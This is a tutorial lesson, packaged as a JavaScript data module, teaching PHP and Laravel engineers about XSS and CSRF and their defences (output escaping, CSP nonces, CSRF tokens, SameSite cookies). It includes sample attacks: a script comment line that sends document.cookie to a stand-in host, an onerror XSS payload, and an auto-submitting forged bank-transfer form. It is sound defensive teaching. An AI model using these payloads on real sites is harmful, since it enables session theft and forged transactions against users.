export default {
  phase: 'Phase 6 · Security & Performance',
  title: 'XSS & CSRF Attacks',
  intro: 'Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most exploited vulnerabilities in web applications. XSS lets attackers inject malicious scripts into pages viewed by other users; CSRF tricks authenticated users into unknowingly submitting state-changing requests. A senior backend engineer must understand both attack vectors in depth, know exactly how PHP and Laravel mitigate them, and be able to configure browser-enforced defences like Content-Security-Policy and SameSite cookies.',
  tags: ['XSS', 'CSRF', 'Content-Security-Policy', 'htmlspecialchars', 'SameSite', 'Laravel CSRF', 'Security'],
  seniorExpectations: [
    'Explain stored, reflected, and DOM-based XSS and give a concrete exploit example for each',
    'Use htmlspecialchars() and htmlentities() correctly and explain the difference',
    'Write a strict Content-Security-Policy header and know which directives block inline scripts',
    'Trace the full CSRF attack flow from attacker-controlled page to victim request',
    'Explain how Laravel generates, stores, and validates CSRF tokens',
    'Know when CSRF tokens are unnecessary (stateless JWT APIs) and why',
  ],
  body: `
<h2>XSS — Three Attack Types</h2>
<p>XSS occurs whenever an application includes user-controlled data in an HTML page without proper encoding. There are three distinct variants, each with different persistence and exploitability characteristics:</p>
<ul>
  <li><strong>Stored XSS:</strong> Malicious payload saved in the database (e.g., a comment). Every user who views that comment executes the script. Highest impact — no user interaction beyond normal browsing required.</li>
  <li><strong>Reflected XSS:</strong> Payload embedded in the URL/query string and immediately echoed back to the response. Attacker tricks the victim into clicking a crafted link. Impact limited to users who click the link.</li>
  <li><strong>DOM-based XSS:</strong> Payload never reaches the server. Client-side JavaScript reads attacker-controlled data (location.hash, document.referrer) and writes it into the DOM unsafely. Server logs show nothing.</li>
</ul>

<div class="code-block">
<div class="code-header"><span class="code-lang">PHP — Stored XSS Vulnerability vs Fix</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-php">&lt;?php
// -------------------------------------------------------
// VULNERABLE: raw user content rendered in HTML
// Attacker stores: &lt;script&gt;fetch('https://evil.io/steal?c='+document.cookie)&lt;/script&gt;
// -------------------------------------------------------
echo "&lt;p&gt;" . $comment['body'] . "&lt;/p&gt;"; // executes attacker script!

// -------------------------------------------------------
// SECURE: always escape output at the point of rendering
// ENT_QUOTES encodes both " and ' — critical for attribute contexts
// -------------------------------------------------------
echo "&lt;p&gt;" . htmlspecialchars($comment['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "&lt;/p&gt;";

// htmlspecialchars() converts:
//   &  →  &amp;
//   &lt;  →  &lt;
//   &gt;  →  &gt;
//   "  →  &quot;
//   '  →  &#039;  (only with ENT_QUOTES)

// htmlentities() does the same PLUS encodes all applicable characters to HTML entities.
// Prefer htmlspecialchars() for UTF-8 apps — htmlentities() can corrupt multibyte chars.

// BLADE (Laravel) — auto-escaped by default:
// {{ $comment }} → escaped
// {!! $comment !!} → RAW — only use for trusted, sanitised HTML (e.g., from a WYSIWYG sanitiser)
</code></pre>
</div>

<h2>DOM-Based XSS</h2>
<p>DOM XSS is invisible to server-side defences because the payload lives entirely on the client. The vulnerability is in JavaScript that reads untrusted sources and writes to dangerous sinks without sanitisation.</p>

<div class="code-block">
<div class="code-header"><span class="code-lang">JavaScript — DOM XSS Vulnerability vs Fix</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-javascript">// -------------------------------------------------------
// VULNERABLE: reading from location.hash and writing to innerHTML
// URL: https://app.com/search#&lt;img src=x onerror=alert(1)&gt;
// -------------------------------------------------------
const query = location.hash.slice(1);
document.getElementById('results').innerHTML = 'Results for: ' + query; // XSS!

// -------------------------------------------------------
// SECURE: use textContent instead of innerHTML for plain text
// -------------------------------------------------------
document.getElementById('results').textContent = 'Results for: ' + query; // safe

// If you must render HTML, use DOMPurify to sanitise first:
// import DOMPurify from 'dompurify';
// document.getElementById('results').innerHTML = DOMPurify.sanitize(query);

// Dangerous sinks to avoid with untrusted data:
//   innerHTML, outerHTML, document.write(), eval(),
//   setTimeout(string), setInterval(string), location.href (javascript: URLs)
</code></pre>
</div>

<h2>Content-Security-Policy</h2>
<p>CSP is an HTTP response header that tells the browser which sources of scripts, styles, and other resources are trusted. A properly configured CSP is the strongest defence-in-depth measure against XSS — even if an injection occurs, the browser refuses to execute scripts from untrusted origins.</p>

<div class="code-block">
<div class="code-header"><span class="code-lang">PHP — Setting CSP Header</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-php">&lt;?php
// Strict CSP using nonces (preferred over hashes for dynamic pages)
$nonce = base64_encode(random_bytes(16)); // generate per-request nonce

header("Content-Security-Policy: "
    . "default-src 'self'; "
    . "script-src 'self' 'nonce-{$nonce}'; "  // only scripts with matching nonce execute
    . "style-src 'self' 'nonce-{$nonce}'; "
    . "img-src 'self' data: https:; "
    . "font-src 'self'; "
    . "connect-src 'self' https://api.myapp.com; "
    . "frame-ancestors 'none'; "              // prevents clickjacking
    . "base-uri 'self'; "                      // prevents base-tag hijacking
    . "form-action 'self';"                    // prevents form hijacking
);

// Nonce used in HTML:
// &lt;script nonce="&lt;?= $nonce ?&gt;"&gt; ... &lt;/script&gt;

// Other important security headers:
header('X-Content-Type-Options: nosniff');      // prevents MIME sniffing
header('X-Frame-Options: DENY');                // prevents clickjacking (older browsers)
header('Referrer-Policy: strict-origin-when-cross-origin');
</code></pre>
</div>

<h2>CSRF — Attack Flow</h2>
<p>CSRF exploits the fact that browsers automatically attach cookies to every request — including requests initiated by a third-party page. The victim is authenticated; the attacker's page submits a forged request that the server cannot distinguish from a legitimate one.</p>
<ol>
  <li>Victim logs in to <code>bank.com</code>. Session cookie is set with no SameSite restriction.</li>
  <li>Attacker sends victim a link to <code>evil.com</code> which contains: <code>&lt;form action="https://bank.com/transfer" method="POST"&gt;&lt;input name="to" value="attacker"&gt;&lt;input name="amount" value="5000"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></li>
  <li>Browser auto-attaches the bank.com session cookie. Transfer is processed as if the victim initiated it.</li>
</ol>

<div class="code-block">
<div class="code-header"><span class="code-lang">PHP — Manual CSRF Token Implementation</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-php">&lt;?php
// --- Token generation (on page load) ---
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 256-bit cryptographic token
}

// Embed in HTML form:
// &lt;input type="hidden" name="csrf_token" value="&lt;?= htmlspecialchars($_SESSION['csrf_token']) ?&gt;"&gt;

// --- Token validation (on form submit) ---
function validateCsrf(): void
{
    $submitted = $_POST['csrf_token'] ?? '';
    $expected  = $_SESSION['csrf_token'] ?? '';

    // hash_equals() is timing-safe — prevents timing attacks
    if (!hash_equals($expected, $submitted)) {
        http_response_code(403);
        throw new \RuntimeException('CSRF token mismatch');
    }

    // Rotate token after use (double-submit prevention)
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
</code></pre>
</div>

<h2>Laravel CSRF Protection Internals</h2>
<p>Laravel's <code>VerifyCsrfToken</code> middleware (registered in the <code>web</code> middleware group) automatically handles CSRF for all state-changing routes. Understanding its internals is a common senior interview topic.</p>

<div class="code-block">
<div class="code-header"><span class="code-lang">PHP — Laravel CSRF Internals</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-php">&lt;?php
// 1. TOKEN GENERATION
//    Session stores a random 40-byte token on first request:
//    $token = Str::random(40);
//    $request->session()->put('_token', $token);

// 2. TOKEN STORAGE
//    Also stored in an XSRF-TOKEN cookie (readable by JS for SPA use):
//    Cookie: XSRF-TOKEN=eyJ... (signed, but not HttpOnly so Angular/Axios can read it)

// 3. TOKEN VALIDATION (VerifyCsrfToken::handle)
//    Middleware checks POST/PUT/PATCH/DELETE requests for:
//      a) _token field in the request body, OR
//      b) X-CSRF-TOKEN header, OR
//      c) X-XSRF-TOKEN header (decoded from the XSRF-TOKEN cookie — for SPAs)
//    Comparison uses hash_equals() to prevent timing attacks.

// 4. EXCLUDING ROUTES from CSRF (e.g., webhooks from Stripe/GitHub):
class VerifyCsrfToken extends Middleware
{
    protected $except = [
        'webhooks/stripe',
        'webhooks/github/*',
    ];
}

// 5. BLADE helper — automatically injects hidden _token field:
// &lt;form method="POST"&gt;
//     @csrf
//     ...
// &lt;/form&gt;

// 6. AJAX with Axios — reads XSRF-TOKEN cookie automatically,
//    sends it as X-XSRF-TOKEN header. No extra configuration needed.
</code></pre>
</div>

<h2>SameSite Cookies</h2>
<p>The <code>SameSite</code> cookie attribute is a browser-level CSRF defence that controls whether cookies are sent on cross-site requests. It eliminates the root cause of CSRF rather than patching around it with tokens.</p>
<ul>
  <li><strong>SameSite=Strict:</strong> Cookie never sent on cross-site requests — not even when following a link from another site. Most secure, but can break OAuth flows and external links.</li>
  <li><strong>SameSite=Lax (recommended default):</strong> Cookie sent on top-level navigation (clicking a link) but NOT on cross-site POST/PUT/DELETE requests. Blocks CSRF while keeping links working. Chrome's default since 2020.</li>
  <li><strong>SameSite=None; Secure:</strong> Cookie sent on all cross-site requests. Required for embedded iframes, payment widgets. MUST be used with HTTPS.</li>
</ul>

<div class="code-block">
<div class="code-header"><span class="code-lang">PHP — Setting SameSite Cookies</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
<pre><code class="language-php">&lt;?php
// PHP 7.3+ — SameSite in setcookie() options array
setcookie('session_id', $token, [
    'expires'  => time() + 3600,
    'path'     => '/',
    'domain'   => 'app.com',
    'secure'   => true,    // HTTPS only
    'httponly' => true,    // JS cannot access (XSS protection)
    'samesite' => 'Lax',   // CSRF protection
]);

// Laravel config/session.php:
// 'same_site' => 'lax'   ← default since Laravel 8
// 'secure'    => true     ← set to true in production
// 'http_only' => true     ← always true

// php.ini equivalent for session cookie:
// session.cookie_samesite = "Lax"
// session.cookie_secure   = 1
// session.cookie_httponly  = 1
</code></pre>
</div>

<h2>When CSRF Tokens Are NOT Needed</h2>
<p>CSRF attacks exploit cookie-based authentication. If your API uses a different authentication mechanism, CSRF tokens add complexity without benefit. Specifically, CSRF protection is unnecessary when:</p>
<ul>
  <li><strong>Bearer token in Authorization header:</strong> Browsers never automatically attach Authorization headers to cross-origin requests — only cookies are auto-attached. A CSRF attacker cannot read the victim's JWT from another origin (CORS prevents it).</li>
  <li><strong>Stateless JWT API consumed by a native app or SPA:</strong> Token stored in memory or localStorage, sent manually in every request header. Cross-site requests from attacker's page cannot access or include the token.</li>
  <li><strong>APIs only called by server-to-server:</strong> No browser involved, no cookies, no CSRF vector.</li>
</ul>

<div class="callout callout-danger">
  <div class="callout-title">Danger</div>
  <p>If your SPA stores the JWT in an HttpOnly cookie (for XSS protection) and sends it automatically, CSRF IS a concern again. You must then combine SameSite=Lax cookies with CSRF tokens or rely on strict CORS configuration with an explicit allowlist of origins.</p>
</div>

<div class="qa-block">
  <div class="qa-q" onclick="toggleQA(this)">
    <span class="qa-q-text">Q: What is the difference between htmlspecialchars() and htmlentities() — and which should you use?</span>
    <span class="qa-arrow">▼</span>
  </div>
  <div class="qa-a"><p><code>htmlspecialchars()</code> encodes only the five special HTML characters (<code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>). <code>htmlentities()</code> encodes all applicable characters including accented letters (e.g., é → &amp;eacute;). For UTF-8 applications, prefer <code>htmlspecialchars()</code> — it is sufficient for preventing XSS and does not corrupt multibyte characters. Always pass <code>ENT_QUOTES | ENT_SUBSTITUTE</code> and <code>'UTF-8'</code> explicitly.</p></div>
</div>

<div class="qa-block">
  <div class="qa-q" onclick="toggleQA(this)">
    <span class="qa-q-text">Q: Why does Laravel store the CSRF token in both the session AND the XSRF-TOKEN cookie?</span>
    <span class="qa-arrow">▼</span>
  </div>
  <div class="qa-a"><p>The session token is the ground truth — it is server-side only. The <code>XSRF-TOKEN</code> cookie (non-HttpOnly) exists so JavaScript frameworks like Axios and Angular can read it and send it back as an <code>X-XSRF-TOKEN</code> header on AJAX requests — without you writing any extra code. Because the cookie is readable only by JavaScript running on the same origin (CORS restricts cross-origin reads), an attacker's page on a different domain cannot access the token value, preserving security.</p></div>
</div>

<div class="qa-block">
  <div class="qa-q" onclick="toggleQA(this)">
    <span class="qa-q-text">Q: Can SameSite=Lax alone replace CSRF tokens?</span>
    <span class="qa-arrow">▼</span>
  </div>
  <div class="qa-a"><p>For most applications, yes — SameSite=Lax blocks the most common CSRF vectors (cross-site POST forms). However, defence-in-depth recommends keeping tokens as well: older browsers do not support SameSite, some same-site subdomains may be partially trusted, and GET requests are still sent cross-site under Lax (which is why state-changing actions should never use GET). Laravel uses both by default.</p></div>
</div>

<div class="keypoints">
  <div class="keypoints-title">Key Points to Remember</div>
  <ul>
    <li>XSS types: <strong>Stored</strong> (persisted in DB), <strong>Reflected</strong> (echoed in response), <strong>DOM-based</strong> (entirely client-side, no server involvement).</li>
    <li>Always escape output with <code>htmlspecialchars($val, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')</code> at the point of rendering into HTML.</li>
    <li>CSP with per-request nonces blocks inline script execution even if XSS payload is injected — a critical defence-in-depth layer.</li>
    <li>CSRF exploits automatic cookie attachment. The attack requires no JavaScript — a plain HTML form on the attacker's page is sufficient.</li>
    <li>Laravel CSRF: <code>VerifyCsrfToken</code> middleware validates <code>_token</code> body field, <code>X-CSRF-TOKEN</code> header, or <code>X-XSRF-TOKEN</code> header for AJAX. Exclude only webhook routes.</li>
    <li><code>SameSite=Lax</code> is the browser-native CSRF defence. Set on all session cookies in production alongside <code>Secure</code> and <code>HttpOnly</code>.</li>
    <li>CSRF tokens are NOT needed for stateless APIs using Bearer tokens in the Authorization header — browsers never auto-attach headers.</li>
    <li>Use <code>hash_equals()</code> for all CSRF token comparisons to prevent timing-based oracle attacks.</li>
  </ul>
</div>
`,
};
